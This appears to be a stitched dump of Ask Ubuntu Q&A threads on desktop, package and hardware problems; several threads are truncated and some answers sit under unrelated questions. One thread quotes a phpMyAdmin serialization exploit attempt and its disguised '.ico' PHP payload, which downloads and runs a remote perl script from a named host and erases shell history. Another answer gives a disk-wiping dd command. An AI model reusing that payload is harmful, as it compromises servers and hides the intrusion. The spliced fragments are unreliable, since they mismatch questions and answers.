There is no need to think about ye olde CVS, so that leaves us SVN and GIT.\nFor your limited use I don't think that it really matters which you choose, so my advice would be to see who you know that uses one of them, and choose that :)\nIf you are looking for ease-of-use for the more complicated stuff (real version control for code etc) I would suggest using GIT. Basically \"them\" say that SVN was an update for CVS, and GIT again is an 'update' to SVN. I personally think that the advantages of GIT over SVN are specifically for multiple users and multiple branches, so maybe not really something you should worry about. \nOn the other hand, why not have some experience with the better option available, you never know what you want to do in the future.\nPlease check out some the info on them\n\n\n*\n\n*http://git-scm.com/about\n\n*http://subversion.apache.org/features.html\n\nA: I do not think you want to do this. Source control is just for that, source control. Most do not handle binary files (like images, music, movies, etc.) very well. \nAlso SCMs will give you a line by line chunk of what data has changed. So every time you log in or log out, you will be changing some data. You will have to \"merge\" or \"commit\" all the time. I am almost certain this is not what you want.\nHowever, there are a couple of really good tools. \nBack-In-Time is awesome, and has a diff viewer. \nDeja Dupe is the default, but I don't think it's very feature rich. \ngrsync can give you a list of files against a backup that have changed. \nand plain old rsync is an option. \nIf you insist on using a SCM then I recommend git, but hosted locally.  Add a .gitignore that excludes all binary files. Better yet, you could try just verson controlling your config directories. Again your going to have to watch out for binary files. \n\nA: Reading through your question again, I think what you want is a local repository created with a tool such as svn, and maintained with its frontend, rapidsvn. This would seem to suit your purpose particularly well: the local repository could be on your main hard disk or on an external drive. It is important to note that version control is best suited to source code or text files or documents and is not suitable for multimedia files. Dropbox or Ubuntu One would be better for that kind of backup. In addition, you can go back to previous versions of files with dropbox. \nAnyway, I will briefly show how the gui tool rapidsvn works and how svn is used from the command-line. \nFirstly, install the necessary files with\nsudo apt-get install subversion rapidsvn\n\nMore information is available at the official site for rapidsvn, although it is important to note that you must still create your svn repository with the command-line first. Make sure you are at the top level of your home folder (enter cd to get to it if necessary) and enter:\nsvnadmin create --fs-type fsfs ~/svn\n\nThen create an initial folder with\nsvn mkdir file:///home/mike/svn/folder -m \"initial folder\"\n\nUsing the quickstart guide we can load up rapidsvn, right click bookmarks and add your repository by clicking Checkout New Working Copy and from then on you can manipulate your files as you wish with checkouts, imports, and commits.\n\nI think this is probably just the gui you were looking for, as it can easily manage all your files, and it is easier to configure the options than using svn on the command-line.\n\nA: You can use Codebase .\n\n*\n\n*It is  software project management tool with fast, reliable & secure Git, Mercurial & Subversion hosting baked right in.\n\n*It can keep track of whole project from the web and deploy repositories straight to the servers.\n\n*It have powerful project management features\nwith advanced ticket management,activity feeds and control of data with customisable permissions,complete search functionality and developer API\n\n\nA: GNU RCS (Revision Control System) manages multiple revisions of files. RCS can store, retrieve, log, identify, and merge revisions. It is useful for files that are revised frequently, e.g. programs, documentation, graphics, and papers. It can handle text as well as binary files, although functionality is reduced for the latter.\nThe basic user interface is extremely simple.  The novice only needs to\nlearn two commands:  ci and co. ci, short for checkin\ndeposits  the  contents  of  a file into an archival file called an RCS\nfile.  An RCS file contains all revisions of a  particular  file.   co is\nshort for checkout.\nNeed to diff your changes?  rcsdiff.\nProject Page: http://savannah.gnu.org/projects/rcs/\nManual: http://www.gnu.org/software/rcs/manual/rcs.html\nI \"need at least 10 reputation to post more than 2 links\" so the following will need to be altered by the reader in order to get to the link.\nWriteup by the author that you may want to read eventually:  \nhttp://www.gnu.org/software/rcs/tichy-paper.pdf \nA nice summary and geneology of various revision control system software available:  \nhttp://en.wikipedia.org/wiki/Revision_Control\n", "Q: ubuntu 12.10.zram-config or zramswap-enabler?Which is better?

I've been using Fedora for a while, but I recently decided to upgrade my ubuntu installation from 12.04 to 12.10. While I was using Fedora, I found xmonad tiling window manager which I sort of got working with xfce. I really like xmonad and I now automatically use the keyboard shortcuts without even thinking. \nSo I would like to use xmonad with unity. Now, I have seen several blog posts etc. that explain how to setup the whole thing in 12.04, with Unity2D. But now, Unity2D has been removed, and the old methods no longer apply. I have read that Unity is actually just a Compiz plugin, and that the wm can't be replaced. Does no version of Unity have a replaceable WM? \nI've also tried MATE (GNOME2 fork) with xmonad on 12.10 and that is totally broken for me, but that's for another question.\n\nA: This isn't possible, Unity needs Compiz as it's a plugin, sorry!\n", "Q: what is the best Google Calender application for unity to alert and notify you with Events? i want some example for the best application/client for manage and edit and control your Google calendar and daily mission or event.\nand it provide alert  -alert with sound or notification- to give you more attention for your important work ?\n\nA: According to this thread. Mozilla Sunbird with the GCALDaemon is what you're looking for. But I believe development is going to be stopped on sunbird, so maybe Thunderbird with the Lightning calendar addon might be best.\n\nA: Here i suggest Sunbird is your the best application/client for manage and edit and control Google calendar and daily mission or event.\n\nA: you can use evolution calendar. You can directly see the events in the date and time applet of unity panel from evolution calendar. You can synchronize the calendar with any online calender like Google calender or Facebook event.\nI think evolution is not by default installed in Ubuntu now but you can install it from synaptic package manager or from Ubuntu software centre. When configuring you can skip the email configuration part and directly go to calender.\nAll the best\n", "Q: Browsing redirected and ad playing in background - Malware? Recently i have noticed when browsing a web page will be redirected to something other than what i click on. For instance, when i tried going to www.askubuntu.com via a link on ubuntu.com it redirected me to some other site than this one.\nAlso when on a page with no flash videos of any kind or pop up windows an ad will start playing. The only way to get it to stop is to wait for it to finish or close the browser and start over again. I have run Clam AV but it has not found anything.\n\nA: All answers to this question will be speculative. In that vein, I suggest experimenting with another browser. Which browser are you using? Firefox? Try Chrome. sudo apt-get install chromium-browser. Chrome? Try Firefox sudo apt-get install firefox. My guess would be some misbehaving browser extension. If so, a completely different browser would help demonstrate.\n", "Q: Suspicious http access log. Please help me! I realized that the following is logged in my http log file.\naction=lay_navigation&eoltype=unix&token=a13369792c1a33ec1130500ca821c5a4&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA_Config%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A47%3A%22ftp%3A%2F%2Fhawk1156%3ATuNPKPK123%40hawkish.co.uk%2Fieh.ico%22%3B%7D%7D\n\nWhen I decode it, it becomes\naction=lay_navigation&eoltype=unix&token=a13369792c1a33ec1130500ca821c5a4&configuration=a:1:{i:0;O:10:\"PMA_Config\":1:{s:6:\"source\";s:47:\"ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico\";}}\n\nI got worried about the suspicious ftp link, and I decided to download it.\nwget ftp://hawk1156:TuNPKPK123@hawkish.co.uk/ieh.ico\n\nThe content of the file was like this: \n<? system(\"cd /tmp;rm -rf *;wget ftp://hawk1156:TuNPKPK123@hawkish.co.uk/2.txt;perl 2.txt;curl -O hawk1156://ftp:TuNPKPK123@hawkish.co.uk/2.txt;perl 2.txt;fetch hawk1156://ftp:TuNPKPK123@hawkish.co.uk/2.txt;perl 2.txt;rm -rf 2.txt;history -c;\");exit?>\n\nOf course, I did never execute it by myself, but I am not sure if my server has already been hacked at this point. What should I do? I don't know where to start.\n\nA: Nothing bad so far, but there is no way to know yet.\nLooking at the suspicious system comment, the command it tries to get you to run appears to delete everything in /tmp, but nowhere else. Moreover, the site in suspicion has been taken down by the hosting provider, so now there should be little to worry about. Do note that MySQL connections over sockets and services will fail until the next reboot due to the deletion of files from /tmp but no data should have been lost(except your bash history).\nI'd just informally tell a PHPMyAdmin developer, so if it is not a security flaw that can be misused, a bug deal isn't really made over it.\nBolded are the interesting bits of commands in the large injected code:\n<? system(\"cd /tmp;rm -rf * ... history -c;\");exit?>\n\nAlso looking through, there is a file, ftp://hawk1156:TuNPKPK123@hawkish.co.uk/2.txt that may have done something bad, but since I don't know what was in the file, and the hosting provider has taken the account down, there is no way to know what it does unless you manage to ext4undelete it to try to get a tally of the damage. *It may have done something bad.* If you do indeed unearth the file with an undelete utility, post it here and I'll gladly look at it.\nEdit: Thanks to January's comment, which I haven't noticed, the most this attack appears to have done is to create an IRC bot. If there is still perl executing, and you do not have any critical services that run on PERL, then run:\nsudo killall perl\n\nor reboot.\n\nA: Yes, someone is attempting to do a PMA (PhpMyAdmin) exploit onto your system as long as your server return a 200 on that request you should be fine. \n", "Q: cd command not working anymore I just did two things : install scm_breeze and mercurial :\ngit clone git://github.com/ndbroadbent/scm_breeze.git ~/.scm_breeze\n~/.scm_breeze/install.sh\nsudo apt-get install mercurial\n\nAnd now my cd command seems to be gone :\ndys@dys-tour:~/prog> cd ~\nbash: /home/dys : is a folder\ndys@dys-tour:~/prog> cd ..\n.. : command not found\n\nThe terminals I opened before installing scm_breeze and mercurial are fine. The terminals I open now have the problem. I uninstalled scm_breeze, with no result.\nWhat can I do to diagnose the problem and fix it ?\n\nA: Removing all traces of sh files installed by scm_breeze fixed the problem.\nIt was (I didn't found where) adding an alias to exec_scmb_expand_args.\n\nA: 'builtin' type cd will tell you what cd actually means for your current shell. It is probably aliased to something else. You can still get the original cd by using 'builtin' cd or 'cd'.\n", "Q: Ubuntu 12.04 driver for Lexmark x4650 Does anyone have a driver (or other way to connect to) a Lexmark x4650 wireless network printer?\n\nA: The x4650 worked perfectly in 10.04. I got printing to work but no luck with the scanner\nFor printing see this question.\nThe main instructions are outlined below:\n\n\n*\n\n*Install fixed-lexmark-1.0-1.i386.deb\n\n*Run:\nsudo chown -Rh root:root /usr/local/lexmark\n\n\n*Add printer with cups by going to http://localhost:631 in your web browser and giving your logon username and password as credentials.\n\n*Give this URL: socket://192.168.2.6:9100 (AppSocket/HP JetDirect )\n\n*Provide a PPD File: /usr/local/lexmark/08zero/etc/lx36-46.ppd (lx36-46.ppd)\n\n\nAnybody got a fix for the scanner?\n", "Q: Redirecting packages when migrating PPAs I have some packages in a PPA and, now, have created a group PPA. Is there a way to put in a redirect such that anyone installing package foo from ppa:jrhacker/ppa can be redirected to ppa:initech/ppa but package bar from ppa:jrhacker/ppa is left alone?\nI don't particularly care if the redirect is an error message telling them the correct migration path. As I see it, I have two options:\n\n\n*\n\n*Always copy the packages from initech/ppa back to jrhacker/ppa.\n\n*Create a dummy package in jrhacker/ppa that, when it runs, spits out an error message with the installation instructions when the program is invoked.\n\n\nI'd like something a bit more elegant than either of these two. Thanks.\n\nA: No, not really.\nThe dummy package would work. As would deleting foo from the PPA, so that nobody can install the old version. Then change the description of the PPA to point the user at the new PPA.\n", "Q: Automatically pass command to Terminal Is there any possibility to put some lines of code automatically to the terminal?\nE.g. when I want to start Hamachi through the terminal and don't want to write long expressions every time.\nMaybe this problem is easy to solve, but I am a beginner and would be thankful for help.\n\nA: ah.. jeah, I take it you want to execute a command, not just put text into the terminal ;-)\nIn your home directory you find a hidden file named .bashrc\nThis file holds a list of commands that are execute whenever you start a shell. You could append your command there...\nBut...\nIf you do this with complex stuff, this stuff will always execute when you open your shell. Depending on what it is this may make your shell unusable.. you don't want that.\nWhat you want is an alias.\nappend to your .bashrc\nalias i_can_remember_that=\"long and strenuous command\"\neverytime you type now i_can_remember_that into your shell, the long command gets executed. You can even pass additional parameters to the alias:\ni_can_remember_that foo will in fact run long and strenuous command foo\nThe name of the alias can be choosen freely of course. Sometimes you even want to override another command that way. i.e. a common alias is:\nalias ls='ls --color=auto -B' which replaces ls with a more complex call of itself.\n", "Q: Incomplete upgrade 12.04 to 12.10 Everything was running smoothly.

I just use synaptic to remove the extra packages. I recommend removing them all and reinstalling the newer versions from PPA or the Ubuntu repo. libnux-2.0.0 in particular is going to stop you from running Unity.\n\n\n*\n\n*You may need to install this from the software centre by searching for 'Synaptic' or by running sudo apt-get install synaptic in a terminal.\n\n*Open Synaptic and click the button in the lower left corner that says 'Origin'.\n\n*On the list of origins that appears above the stack of buttons where you just clicked, select 'Local' so that synaptic now looks like this: As you can see, I also have a number of packages installed left over from my upgrade, although most of mine are not there in error (Amnesia, Bastion)\n\n*You can use the check-boxes to remove packages that you don't want or need. Click on them and choose 'Completely Remove' You just need to make sure that nothing you do want to keep is removed with it. When you see the window below, check the list of packages for ones you do not want to remove.If you find there are a lot of apps there you want to keep, they were probably installed via PPA and are at a newer version than in the Ubuntu repository. Either remove them and add back the version from the Ubuntu repo, or add the PPA back and the packages will be removed from the listing of local/obsolete packages after an apt-get update or clicking reload in Synaptic.\n\n*Work through each item on the list, and then click apply to have synaptic remove those local/obsolete packages that were left behind.\nThat should effectively complete the clean-up that the release upgrader so often messes up. (for me at least)\nI can see why Unity is not working for you. Some of the libraries it needs to work in Quantal are still on old versions on your machine. If running sudo apt-get update; sudo apt-get upgrade; sudo apt-get install unity does not solve the problem, you'll need to remove these packages using Synaptic and then reinstall the newer versions from the repo.

free will only report memory use.\nLook at the results to see if you are not using swap (low RAM) or if your cpu is not being eaten by some other process. \nOBS: you can also use top that is pre-installed but I think its output confuse...\n\nA: Maybe you don't have OpenGL acceleration in your GPU? In 12.10 there is no Unity 2D - it was used on machines, that have old or integrated graphics cards. Now, every machine use Unity3d.

Can it be removed without removing all others? I've just noticed that those two, which I have completely no use of, are part of the common package. This means I cannot remove them without removing everything. But I like all the other webapps, GMail, Docs and so on. I just don't want Amazon popping up in my launcher when I go there once a blue moon and not leaving until I turn Firefox off. Is there any way I can remove it without removing the rest?\n\nA: As discussed in the comments to the previous answer (by Paul Hänsch), the Amazon webapp is part of 'unity-webapps-common', and all the other 'unity-webapps-*' depend on 'unity-webapps-common', so at this time there is no way to remove the Amazon webapp without removing the rest.\nHowever, I just discovered a way to disable the Amazon webapp, without uninstalling it, so you can leave other webapps installed and not be bothered by the Amazon webapp.\n\n\n*\n\n*open 'dconf-editor'\n\n*go to 'com>canonical>unity>webapps'\n\n*edit the \"preauthorized\" field to say just '[]' (or remove 'amazon.com', and any other desired domains from the list)\n\n*visit www.amazon.com\n\n*when prompted to \"install Amazon\", tell it \"Don't ask again\".\n\n\nI found these instructions here:\nhttps://twitter.com/ghalfacree/statuses/269760421437775872\n\nA: The common package does not itself contain any software, only dependencies. Your only problem ist, that by removing the common package (which you apparently have to do, if you want to get rid of amazon) tghe package manager sees no need anymore to keep all other applications. Because it considered them just a nasty dependency of common in the first place.\nYou can safely mark the commons package for removal and mark all packages you want to keep for installation. Depending on the package manager you use, you can do this in one step, before executing the change, so the packaging system will not remove, redownload and reinstall any software. It will just keep everything you marked for ... keeping.\n", "Q: How do I remove my Facebook account from Gwibber? I started using Ubuntu 12.10 today, and put in my social networking details in Online Accounts under System Settings.\nI like being able to chat with my Facebook friends in Empathy, but I don't necessarily want my tweets to go to Facebook. I want to remove Facebook from Gwibber, but not Empathy. How do I do this? There is nothing in Gwibber preferences and I can't see how to do it in Online Accounts.\nThe reason I want to remove it is that it isn't clear enough which accounts are posted to and I don't necessarily want the feeds mixing together.\n\nA: As an option, you can delete the package gwibber-service-facebook.\nTo do this just run terminal and execute the command:\nsudo apt-get remove gwibber-service-facebook\n\n\nA: I haven't tried this yet, but I recently asked the same question on G+, and this is the answer I received: \n'sudo sed -i 's/NoDisplay=true/NoDisplay=false/g' /etc/xdg/autostart/*.desktop \nGo into startup applications and uncheck gwibber'\nHope that helps.\n", "Q: Issues With Nautilus 3.6 after upgrading from v3.4 12.10 In version 3.6 is that it cannot save the change in view of folders and windows.

The command sudo apt-get install unity doesn't work, and I don't know how to fix it...\n\nA: Unity is not available for Ubuntu 10.04, you have to use at least Ubuntu 11.04 (where it is installed by default). \nAs support for 11.04 ends 2012-10-31 and Unity isn't that stable there anyway better use 12.04 for Unity.\n", "Q: How do I install Star Wars Battlefront 1? I can Install most windows games but I can't install Star Wars Battlefront on my Ubuntu 12.10 laptop computer.\n\nA: Star Wars Battlefront 1 can sometimes work on wine, but often there are problems or glitches with the graphics, so it depends on your particular setup and version of wine as to if or how well it will run. It may well be available on Steam in the near future, but that is just surmise. \nNevertheless, so we can get an answer for this question, here's how I installed it on Ubuntu 12.04, which was largely a similar process to that very briefly mentioned on the information page at WineHQ.\nI usually recommend using a fresh WINEPREFIX for every new application installed with wine, as that very often eliminates problems that using the default ~/.wine folder with everything can cause. \nNote: Playonlinux can be used to install it as well, but here's how I did it manually. If you don't fancy all the barrage of terminal commands below, you can use playonlinux to install, but see my important note further below about securom errors.\n1) Locate your legal copy of the game and its 3 cds (you will need the CD key as well) and place the first disk in the drive and make sure it mounts correctly.\n2) Create your new WINEPREFIX with:\nWINEPREFIX=$HOME/.battlefront1 winecfg\n\nThis will make the wine configuration window come up, and before you dismiss it, check the drive letter that the battlefront CD has been symlinked to (usually D:).\n2) Start the install (assuming the wine drive is D:):\nenv WINEPREFIX=$HOME/.battlefront1 wine \"D:/GameData/setup.exe\"\n\n(You can of course export the WINEPREFIX environmental variable to your environment, but for clarity I will specify it each time here with env.)\n3) Enter the CD key and let the installer begin. When you swap disks, wait for the next disk to mount before you click continue. When you get the confirmation screen that it has installed, do not launch it yet.\n4) Download the official Lucasarts patch and install it:\ncd \nwget \"ftp://ftp.lucasarts.com/patches/pc/Battlefront1_2_Eng.exe\"\nenv WINEPREFIX=$HOME/.battlefront1 wine \"Z:/home/mike/Battlefront1_2_Eng.exe\"\n\nThe drive letter referring to the local filesystem should be Z: and the command assumes the file is in your home folder.\n5) Now, if you try to run the program it will hang or give you an error about securom, as wine doesn't support securom. The only way to get around this is to use a no-cd 'patched' executable that supports version 1.2 English (or your language).\nDisclaimer: For legal reasons, I cannot provide any download links for patched executables.\n6) After all that is sorted out you may want to tweak some graphic settings with winetricks:\nenv WINEPREFIX=$HOME/.battlefront1 winetricks\n\nIt is tricky to specify what settings to alter, but often those to do with pixel shading and multisampling need to be off, but you may need to tweak other ones and experiment a little.\n7) Finally, run the game with:\nenv WINEPREFIX=$HOME/.battlefront1 wine \"C:/Program Files/LucasArts/Star Wars Battlefront/GameData/Battlefront.exe\"\n\nYou must always run it from the Gamedata folder and never with the launcher.\nIt is difficult to say how well it will run on other systems, and often there are regressions in wine so it may be difficult to run at all, so keep an eye on the WineHQ page. This guide might be useful for you for this game, or to use as a model for installing other games as well using wine.\n\nA: In addition to @user76204's comment and perhaps a more simple or elegant solution, if you own the games on Steam or are not opposed to purchasing them again on Steam both work great with the Steam compatibility layer Proton.\nAccording to ProtonDB both the classic Battlefront 1 and Battlefront 2 work very well on Proton. I have found that using Proton in addition to or as a replacement for WINE is a remarkably simple solution for getting non-GNU/Linux games to run.\nHere is a fairly straightforward explanation on how to run Steam games with Proton.\nTo do so:\n\n*\n\n*Right click on the game on the Steam menu.\n\n*Select the \"Properties\" option.\n\n*Then select the \"Compatibility\" option on the left-hand side.\n\n*Then select the \"Force the use of a specific Steam Play compatibility tool.\"\n\n*Install the game.\n\n", "Q: Chromium web-app creation doesn't work in 12.10? If you create an application of a website in Chromium and choose \"desktop\", a .desktop file is created.

To correct this, you only have to open the .desktop created with a text editor and add a new line between those two lines.\nPS: The Exec line is correct: if you execute /usr/bin/chromium-browser --app=http://buymeapie.com/ in a terminal the  website is shown.\n", "Q: Installing Plesk on Ubuntu 11.04?

So by mounting under /mnt (which, by the way, is usually left as an empty folder to mount to directly in case the sysadmin needs a quick mount point), you are hiding them yourself!\nThere are two solutions.  First, mount them under /media.  This is quick and painless.\nSecond, you could write a udev rule that tells udisks to recognize them (Nautilus uses udisks IIRC), even though they're mounted somewhere else.  I haven't tried this method, but it might work.  Make a udev rule, like /etc/udev/rules.d/10-showdrives.rules, and put in it the following:\nKERNEL==\"sda[0-9]\", ENV{UDISKS_IGNORE}=\"0\"\n\nOr if you want to use UUIDs (a good idea), have one line looking something like the following for each of your volumes.\nSYMLINK==\"disk/by-uuid/YOUR_UUID_HERE\", ENV{UDISKS_IGNORE}=\"0\"\n\nIf the latter doesn't work, rename the file to something like 99-showdrives.rules to let udev make symlinks.    \nI adapted this from the opposite advice (which I have tried; it works) at\nthe Arch Wiki page for KDE.\n", "Q: Kernel Panic while Installing Ubuntu 12.10 from USB Drive Good evening,\nI recently looked into installing Ubuntu alongside my Windows. I was able to mount the iso on a USB drive using Universal USB Installer. I verified it with the MD5sum utility and the hash is correct. When installing, I can get to the screen where I choose the boot order, select the USB drive, and then I get to a screen where Ubuntu seems to be 'loading' (purple background with Ubuntu logo and name in the middle). Then, all of a sudden, I get a \"Kernel Panic - Not syncing: fatal exception in interrupt\" error message. My specs : \nIntel Core 2 Duo CPU T5850 @ 2.16 GHz / 4 GB of ram / Packard Bell computer from 2007. / Windows 7 Ultimate x64 installed. What should I do now ? \nThanks for your help.\n\nA: That seems to be an hardware failure using Ubuntu software architecture... That fault is hard to discover, my guess is CPU overload or some bridge overload due to high speed disk communication... I have a similar situation when I boot from USB3 port, but, if I boot in the USB2 port everything works, which proves that software and configuration is OK, the solution is just to make things work slower!\n", "Q: Will upgrading from Ubuntu 10.04 to 10.10 delete my personal data? I am planning to upgrade my operating system Ubuntu 10.04 to Ubuntu 10.10. I want to know whether this upgrading will delete all the data or not? \n\nA: As 10.10, and 11.04 even, are now end of life, while 11.10 will be in ~6 months, you should probably just upgrade direct to 12.04 instead.\nAn upgrade will only upgrade programs which are installed, though some old, unused, or no longer supported applications and libraries, may be removed during install; though you will have the option to keep them if so.\nIf you do an install from USB/CD-ROM/etc… then it will depend on how your system is currently partitioned, and whether you format or repartition any of it for the installation.\nIn either case, there is of course still risk of losing data, as there is no guarantee from Ubuntu that your hardware or power won't fail during the upgrade, or that some other external factors will not happen.\nYou should always back up any important and non-recoverable data.\n", "Q: After upgrade to xubuntu 12.10 I have 2 mount points for each partition \nJust upgraded Xubuntu 12.04 to 12.10 (both XFCE and LXDE desktops are being used at this system).

What could cause this problem? Is it a bug?\n\nA: This happened to me as well.  I was just experimenting with settings when I found a way to remove the duplicates.  It is by no means a solution, but I thought I'd share the observation.\nThere is a setting in Settings Editor called \"/desktop-icons/style\" and if you change it from the default 2 to 1 and then back to 2, the duplicates are gone...  You can alternatively run the following two lines:\nxfconf-query -c xfce4-desktop -p /desktop-icons/style -s 1\nxfconf-query -c xfce4-desktop -p /desktop-icons/style -s 2\n\nI'm not really sure of the reason, this was just something I observed.

Everything went smoothly until I tried to also upgrade the nvidia drivers using the additional drivers tab in the Software Sources application.\nNow the tablet is recognized (it shows up in the output from lsusb and xsetwacom --list devices) but neither the Wacom mouse or pen controls the cursor.  By plugging in a USB mouse I do get a working mouse.  The strangest part is that occasionally the tablet works but I can't find any pattern to when this happens.  I've tried all the different nvidia drivers, but the problem is the same. \nPossibly coincidently or they may have been there before and I didn't notice them, I now get some messages on shutdown that I don't know the meaning of:\nRather than invoking init scripts through /etc/init.d use the service(8) utility, e.g. service S35 networking stop\ninitctl : unknown job S35networking\nSince the script you are attempting to invoke has been converted to an Upstart job, you may also use the stop(8) utility, e.g., stop S35networking\nIs there a way to repair my installation or should I just do a fresh install of 12.10?\n\nA: I would recommend a fresh install; it might be possible to pick through what is causing the problem (and it might be interesting to do so) but the fastest way to cure the problem is probably going to be a fresh install of 12.10.\nIt's certainly not a problem I've seen before.\n", "Q: Trouble opening Disk Manager in Windows 7 after installing Ubuntu 12.10 I have two disks, a SSD with my Windows 7 installation and a mechanical disk with my Ubuntu 32-bit installation.\nAfter deciding to install Ubuntu 12.10 alongside my Windows 7 installation I opened the Disk Manager in Windows and shrunk my secondary drive with 30GB. \nThen I installed Ubuntu through the install alongside Windows option.\nAfter deciding to upgrade my Ubuntu installation to 64-bit, I decided to remove it from the disk manager. The problem is that now the Disk Manager won't open. The status is \"Connecting to the service Virtual Disk Service\". (Translated from Swedish) \nAnyone have any idea about how to solve this?\n\nA: This sounds like a bug in the Windows Disk Manager software; there isn't much that you can do, or Ubuntu can do here. Report the problem to Microsoft and hope they can fix it for you.\n\nA: Looking at the MS forums, there seems to be several things that can cause this issue, so it's hard to know for sure what's going on, but I think the problem here was caused by the way you installed Ubuntu. If you shrink the Windows partition with disk manager first, you don't want to choose install alongside windows. I believe that shrinks the Windows partition again, leaving the other space unused. I suspect either the Windows partition is now too small (Windows 7 seems to need 40 GB) or file corruption is causing Windows to see the disk as damaged.\nYou might try booting from a live cd/usb and use gparted to delete everything but the Windows partition. Boot into Windows (you will probably need to restore the Windows mbr with a restore disk. Google that if you don't know how, it's easy.), then run chkdsk. When reinstalling Ubuntu, choose the option to use the available space (easy) or use the partitioner to create the partitioning scheme you want in the empty space first (much more advanced if you haven't done it before).\nIf disk manager still does not open after running chkdsk, use the live distro to expand the size of the Windows partition, probably to fill the entire disk. When reinstalling Ubuntu after this you can use the Install Alongside option.\n", "Q: How do I restore Déjà Dup backups without Déjà Dup?

Unfortunately, the setting was not remembered.\nFrom thread (2), comment 13, I was able to get the system to remember the setting, but not to use it. For the record, on my system, it's necessary to adjust the path in rc.local:\n#!/bin/sh -e\n#\n# rc.local\n#\n# This script is executed at the end of each multiuser runlevel.\n# Make sure that the script will \"exit 0\" on success or any other\n# value on error.\n#\n# In order to enable or disable this script just change the execution\n# bits.\n#\n# By default this script does nothing.\necho 0 > /sys/class/backlight/apple_backlight/brightness\nexit 0\n\nThis successfully records the brightness level of the screen at shutdown, but it has no effect on the screen brightness. I can tell the value is recorded because:\n\n\n*\n\n*/sys/class/backlight/apple_backlight/brightness contains a value at startup\n\n*the slider in the Brightness and Lock panel is in the right position\n\n*when I change move the slider in Brightness and Lock, or when I use the brightness function keys, the screen brightness changes to the next value to the value recorded in the brightness file (for example, if I use the function keys to set the backlight to the dimmest setting where it's still on, restart and use the function keys to dim the screen once, the backlight turns off)\n\n\nDoes anyone have any idea how to complete the last piece of the puzzle?\n\nA: have you tried to set up manually in xrandr?\nJust try this one: to set brightness as 0.8 type this command in ~/.xprofile (make this file if it is not available yet)\nxrandr --output LVDS1 --brightness 0.8\n\nThe code above is to set the main monitor (LVDS1) brightness to be 0.8.

It has to do with the setting getting changed, but the hardware not picking up the change. For some Macbook Pro users, it doesn't matter what you change it to, or if you hard-change it manually by echoing the \"setting\" to the register, the flag gets changed, but the hardware does not pick up that change. It has to do with the ACPI interface to the hardware.\n* There is a current work-around, although not elegant. If you get into OSX and change your brightness settings, then when you reboot and get back into Ubuntu, that last OSX brightness setting is the setting that is current when Ubuntu boots up.\nIf you have that problem, please subscribe to this bug, to help it get resolved:\nBacklight control does not work, but there are entries in /sys/class/backlight.\n\nA: I wonder if it may have something to do with whether you are booting in EFI mode.

The machine is a Pentium 4 @ 3.06, 2Gb RAM, 200GB Hard Drive and a NVidia GeForce 8800 GT.\nA few days ago, I tried Ubuntu without installing and it worked perfectly. Yesterday, I decided to formatted the hard drive and divide my hard drive into four partitions: 1 for the XP, 1 for Ubuntu, 1 for swamp and 1 where I will have my documents.\nEverything went great, I installed XP and then Ubuntu but I did something wrong on the partition window (Ubuntu partition window) that I ended up without boot loader.  This morning, I formatted everything again, installed XP and when I went to install Ubuntu (with the same DVD as before) the problems started.\nFirst, I had a black screen with a message written with white text saying something like: \n\nunable to find a medium containing a live file system. \n\nAfter I burned another CD and tried again, I got stuck at the red dots (loading screen).  I then went online and I read somewhere that it could be the CD, so I checked the integrity of the CD and everything was fine.  I also unplugged all USBs connected to the computer and nothing changed. \nI googled further options to try to solve my problem and some users suggested that people having these types of problems should try the alternate installation, which if I am not wrong is for networks. I then tried to install and yes the installation process was different from the normal CD, but it did get stuck on a page where it was doing something, like: ...finding ethd0 and it was stuck on the 100%.\nI tried USB installation as well and it also got stuck at the red dots (I do not have USB 3.0 on the computer in question).\nI have burned 5 different CD's and all at low speed. I checked the integrity and all are fine. I downloaded other distribution as well as other versions of Ubuntu and I still cannot install or even run the Live CD of Ubuntu or any other distribution.\nWhat is really annoying me is that everything was working perfectly before, when I first tried to install Ubuntu.\nEdit:\nMy boot load is normal, no errors and all the hardware is working fine. \nI forgot to mention that after the loading screen (red dots) gets stuck, the DVD drive and the hard drive goes into idle state. I also restored the default values of the BIOS and no luck.\n\nA: *\n\n*Try to read boot process messages. Start ubuntu without \"quiet splash\" and kernel command line.\n\n*Try to read logs from booting system\n\n*Look for I/O errors in logs. They tell that your cd or hdd have hardware problems.\n\n*If you messed up partition table try to erase your hdd boot sector. Use dd if=/dev/zero of=/your/hdd bs=1M count=1 It will wipe all data!

I have a 320 GB external hard drive connected to my MacBook Pro (5, 5). There are 2 partitions on it, one has data and the other one is empty. I tried installing Ubuntu on the empty partition but it gives me an error about my partition map. Does anybody know the solution to this?\n\nA: Use caution if attempting the following! Be sure you know what you are doing.\nI believe you have to temporarily modify your bios settings to have the primary disabled, and have the connected external be recognized (the specific settings will differ between machine varieties).  With this accomplished you can then boot from live cd or usb and should be able to install as you normally would except it will be on the primary.  After that is completed return to bios after rebooting again, re-enable the primary drive and set your boot order preference.\nThat said, if you are not extremely comfortable messing with these settings do not proceed as you may be very sad at the outcome.\nOne other option, that I'm not sure if it will work or not is to create another smaller partition within the free partition and try to use unetbootin to image that partition only,  I have not tried to image a partition with it before, but if you can select this smaller partition within the unetbootin program I think you will get the result you are looking for, then you should be able to mount the main segment of the partition when booting from it, but as I said I haven't tried this, only in theory...I was planning on trying a similar setup as you are in the near future and if I get that done before you give it a go I will update the info as needed.\n", "Q: Access Prompt keeps asking for GMail password A pop up keeping appearing in Ubuntu (running 12.10), asking for the password to my gmail account. The icon has a silver shield, and it is labeled Access Prompt. \nThe actual window has an image of keys on a keyring, says “Authentication request” in bold, and “Please enter your password for the account, [gmail address]”. It keeps saying my passwords are incorrect... I'm not even sure which account it's talking about. What is going on?\n\nA: Evgeni Leshtanski's answer clued me in to what was really happening. The question isn't, \"How do I tell some random prompt what my password is?\" but rather, \"What is going on?\"\nIn my case -- and this probably affects a lot of people -- the underlying culprit was Empathy. I don't use Empathy, so I don't want it to authenticate to Google Talk on my behalf. Now here's where it gets interesting. When I followed Evgeni's lead and ran Online Accounts (under System Settings), it was completely unpopulated. That's because it auto-populates when apps that hook in to Online Accounts update credentials. Since I never filled in that Access Prompt dialog box, this never happened and I had nothing to change.\nThe key action that's leading this behavior on startup is that Empathy defaults to \"Automatically connect on startup\" even if you don't actually use it. So run Empathy, go to Preferences, and under the General tab, uncheck \"Automatically connect on startup\".\nIn my particular case, I had to also stop Evolution from checking my Gmail account before this dialog box went away completely.\n\nA: Try renaming the 